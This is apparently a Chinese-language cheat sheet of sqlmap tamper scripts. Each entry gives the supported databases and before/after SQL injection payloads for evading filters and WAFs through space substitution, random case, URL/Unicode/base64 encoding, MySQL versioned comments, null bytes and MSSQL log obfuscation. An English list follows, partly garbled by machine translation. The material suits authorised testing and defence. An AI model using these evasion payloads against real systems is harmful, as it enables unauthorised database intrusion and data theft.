# 常用脚本

>[!NOTE]+ 用法
>添加参数 `--tamper "scriptname"`
## 绕过空格检测
#### **space2plus.py**

适用数据库：ALL  
作用：用加号替换空格  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT+id+FROM+users`

#### **multiplespaces.py**

适用数据库：ALL  
作用：围绕sql关键字添加多个空格  
使用脚本前：`tamper('1 UNION SELECT foobar')`  
使用脚本后：`1 UNION SELECT foobar`

#### **space2randomblank.py**

适用数据库：ALL  
作用：将空格替换为其他有效字符  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT%0Did%0DFROM%0Ausers`

#### **space2dash.py**

适用数据库：ALL  
作用：将空格替换为`--`，并添加一个随机字符串和换行符  
使用脚本前：`tamper('1 AND 9227=9227')`  
使用脚本后：`1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227`

#### **space2mysqldash.py**

适用数据库：MySQL、MSSQL  
作用：将空格替换为 `--` ，并追随一个换行符  
使用脚本前：`tamper('1 AND 9227=9227')`  
使用脚本后：`1--%0AAND--%0A9227=9227`

#### **space2hash.py**

适用数据库：ALL  
作用：pounds comment character “#” followed by a linefeed a random string of characters and replace the space character

#### **space2morehash.py**

适用数据库：MySQL >= 5.1.13  
测试通过数据库：MySQL 5.1.41  
作用：将空格替换为`#`，并添加一个随机字符串和换行符  
使用脚本前：`tamper('1 AND 9227=9227')`  
使用脚本后：`1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227`

#### **space2mssqlhash.py**
适用数据库：Microsoft SQL Server  
作用：pounds comment symbol “#” followed by a space character to replace newline

#### **space2mysqlblank.py**

适用数据库：MySQL  
测试通过数据库：MySQL 5.1  
作用：将空格替换为其他空格符号`('%09', '%0A', '%0C', '%0D', '%0B')`  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT%0Bid%0DFROM%0Cusers`

#### **space2mssqlblank.py**

适用数据库：Microsoft SQL Server  
测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005  
作用：将空格随机替换为其他空格符号`('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A')`  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT%0Eid%0DFROM%07users`

#### **space2comment.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：将空格替换为`/**/`  
使用脚本前：`tamper('SELECT id FROM users')`  
使用脚本后：`SELECT/**/id/**/FROM/**/users`


## 大小写绕过

#### **randomcase.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：随机大小写  
使用脚本前：`tamper('INSERT')`  
使用脚本后：`INseRt`

## 其他绕过
#### **apostrophemask.py**

适用数据库：ALL  
作用：将引号替换为utf-8，用于过滤单引号  
使用脚本前：`tamper("1 AND '1'='1")`  
使用脚本后：`1 AND %EF%BC%871%EF%BC%87=%EF%BC%871`

#### **base64encode.py**

适用数据库：ALL  
作用：替换为base64编码  
使用脚本前：`tamper("1' AND SLEEP(5)#")`  
使用脚本后：`MScgQU5EIFNMRUVQKDUpIw==`

#### **nonrecursivereplacement.py**

适用数据库：ALL  
作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）  
使用脚本前：`tamper('1 UNION SELECT 2--')`  
使用脚本后：`1 UNIOUNIONN SELESELECTCT 2--`

#### **unionalltounion.py**

适用数据库：ALL  
作用：将`union allselect` 替换为`unionselect`  
使用脚本前：`tamper('-1 UNION ALL SELECT')`  
使用脚本后：`-1 UNION SELECT`

#### **securesphere.py**

适用数据库：ALL  
作用：追加特定的字符串  
使用脚本前：`tamper('1 AND 1=1')`  
使用脚本后：`1 AND 1=1 and '0having'='0having'`

#### **between.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：用`NOT BETWEEN 0 AND #`替换`>`  
使用脚本前：`tamper('1 AND A > B--')`  
使用脚本后：`1 AND A NOT BETWEEN 0 AND B--`

#### **percentage.py**

适用数据库：ASP  
测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0  
作用：在每个字符前添加一个`%`  
使用脚本前：`tamper('SELECT FIELD FROM TABLE')`  
使用脚本后：`%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E`

#### **sp_password.py**

适用数据库：MSSQL  
作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password  
使用脚本前：`tamper('1 AND 9227=9227-- ')`  
使用脚本后：`1 AND 9227=9227-- sp_password`

#### **charencode.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）  
使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')`  
使用脚本后：`%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45`

#### **charunicodeencode.py**

适用数据库：ASP、ASP.NET  
测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3  
作用：适用字符串的unicode编码  
使用脚本前：`tamper('SELECT FIELD%20FROM TABLE')`  
使用脚本后：`%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045`

#### **equaltolike.py**

测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5  
作用：将`=`替换为`LIKE`  
使用脚本前：`tamper('SELECT * FROM users WHERE id=1')`  
使用脚本后：`SELECT * FROM users WHERE id LIKE 1`

#### **greatest.py**

测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0  
作用：将`>`替换为GREATEST，绕过对`>`的过滤  
使用脚本前：`tamper('1 AND A > B')`  
使用脚本后：`1 AND GREATEST(A,B+1)=A`

#### **ifnull2ifisnull.py**

适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)  
测试通过数据库：MySQL 5.0 and 5.5  
作用：将类似于`IFNULL(A, B)`替换为`IF(ISNULL(A), B, A)`，绕过对`IFNULL`的过滤  
使用脚本前：`tamper('IFNULL(1, 2)')`  
使用脚本后：`IF(ISNULL(1),2,1)`

#### **modsecurityversioned.py**

适用数据库：MySQL  
测试通过数据库：MySQL 5.0  
作用：过滤空格，使用mysql内联注释的方式进行注入  
使用脚本前：`tamper('1 AND 2>1--')`  
使用脚本后：`1 /*!30874AND 2>1*/--`

#### **modsecurityzeroversioned.py**

适用数据库：MySQL  
测试通过数据库：MySQL 5.0  
作用：使用内联注释方式`（/*!00000*/）`进行注入  
使用脚本前：`tamper('1 AND 2>1--')`  
使用脚本后：`1 /*!00000AND 2>1*/--`

#### **bluecoat.py**

适用数据库：Blue Coat SGOS  
测试通过数据库：MySQL 5.1,、SGOS  
作用：在sql语句之后用有效的随机空白字符替换空格符，随后用`LIKE`替换`=`  
使用脚本前：`tamper('SELECT id FROM users where id = 1')`  
使用脚本后：`SELECT%09id FROM users where id LIKE 1`

#### **versionedkeywords.py**

适用数据库：MySQL  
测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11  
作用：注释绕过  
使用脚本前：`tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#')`  
使用脚本后：`1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#`

#### **halfversionedmorekeywords.py**

适用数据库：MySQL < 5.1  
测试通过数据库：MySQL 4.0.18/5.0.22  
作用：在每个关键字前添加mysql版本注释  
使用脚本前：`tamper("value' UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND 'QDWa'='QDWa")`  
使用脚本后：`value'/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(32)),/*!0CHAR(58,97,110,121,58)),/*!0NULL,/*!0NULL#/*!0AND 'QDWa'='QDWa`

#### **apostrophenullencode.py**

适用数据库：ALL  
作用：用非法双字节Unicode字符替换单引号  
使用脚本前：`tamper("1 AND '1'='1")`  
使用脚本后：`1 AND %00%271%00%27=%00%271`

#### **appendnullbyte.py**

适用数据库：ALL  
作用：在有效载荷的结束位置加载null字节字符编码  
使用脚本前：`tamper('1 AND 1=1')`  
使用脚本后：`1 AND 1=1%00`

#### **chardoubleencode.py**

适用数据库：ALL  
作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）  
使用脚本前：`tamper('SELECT FIELD FROM%20TABLE')`  
使用脚本后：`%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545`

#### **unmagicquotes.py**

适用数据库：ALL  
作用：用一个多字节组合`%bf%27`和末尾通用注释一起替换空格  
使用脚本前：`tamper("1' AND 1=1")`  
使用脚本后：`1%bf%27 AND 1=1--`

#### **randomcomments.py**

适用数据库：ALL  
作用：用注释符分割sql关键字  
使用脚本前：`tamper('INSERT')`  
使用脚本后：`I/**/N/**/SERT`

## 其他
1.  _apostrophemask.py_ replace single quote character in UTF-8-byte characters
2.  _apostrophenullencode.py_ replace single-quote character with an illegal double-byte Unicode characters
3.  _appendnullbyte.py_, add a null character at the end of payload encoding
4.  _base64encode.py_ use Base64 encoding for a given payload all characters
5.  _between.py_, “the BETWEEN the AND # #” is replaced with “NOT BETWEEN 0 AND #” replace greater-than sign “>” equal sign “=”
6.  _bluecoat.py_ After the SQL statements replace spaces with valid random whitespace, followed by “the LIKE” Alternatively equal sign “=”
7.  _chardoubleencode.py_ use double URL encoding for a given payload all characters (not handle characters already encoded)
8.  _charencode.py_ use URL encoding for a given payload all characters (not handle characters already encoded)
9.  _charunicodeencode.py_ use Unicode URL encoding for a given payload of non-coded character (the character does not handle already encoded)
10.  _concat2concatws.py_ with Examples “CONCAT_WS (MID (CHAR (0 ), 0, 0), A, B)” replacement image “CONCAT (A, B)” is
11.  _equaltolike.py_ with “the LIKE” operator replace all equal sign “=”
12.  _greatest.py_ Alternatively greater than “>” use “GREATEST” function
13.  _halfversionedmorekeywords.py_ add MySQL comments before each keyword
14.  _ifnull2ifisnull.py_ with “IF (ISNULL (A), B, A)” replacement image “IFNULL (A, B)” Examples
15.  _lowercase.py_ replace the value of each keyword character lowercase
16.  _modsecurityversioned.py_ surrounded by complete query with a comment
17.  _modsecurityzeroversioned.py_ comments with zero digits of which is surrounded by a full inquiry
18.  _multiplespaces.py_ add more spaces around SQL keywords
19.  _nonrecursivereplacement.py_ replace the predefined keywords using SQL representations, a filter suitable for
20.  _overlongutf8.py_ conversion to all characters in a given payload among
21.  _percentage.py_ add a percent sign before each character
22.  _randomcase.py_ random character case conversion for each keyword
23.  _randomcomments.py_ insert random comments to SQL keywords
24.  _securesphere.py_ add the string through a special configuration
25.  _sp_password.py_ Appends ‘sp_password’ to the end of the payload for automatic obfuscation from DBMS logs
26.  _space2comment.py_ replace spaces with “/ ** /”
27.  _space2dash.py_ dash comment character “-” followed by a linefeed a random string of characters and replace the space character
28.  _space2hash.py_ pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
29.  _space2morehash.py_ pounds comment character “#” followed by a linefeed a random string of characters and replace the space character
30.  _space2mssqlblank.py_ replace spaces with a set of valid candidate among the set of random character whitespace
31.  _space2mssqlhash.py_ pounds comment symbol “#” followed by a space character to replace newline
32.  _space2mysqlblank.py_ replace spaces with a set of valid candidate among the set of random character whitespace
33.  _space2mysqldash.py_ dash comment character “-” followed by a linefeed character replace spaces
34.  _space2plus.py_ a plus “+” with spaces
35.  _space2randomblank.py_ replace spaces with a set of valid candidate among the set of random character whitespace
36.  _unionalltounion.py_ Replaces UNION ALL SELECT with UNION SELECT
37.  _unmagicquotes.py_ use a combination of multi-byte% bf% 27 and the end of general note replaced with spaces
38.  _varnish.py_ add an HTTP header “X-originating-IP” to bypass WAF
39.  _versionedkeywords.py_ surrounding each non-comment function key with MySQL
40.  _versionedmorekeywords.py_ surrounded by each keyword with a MySQL Notes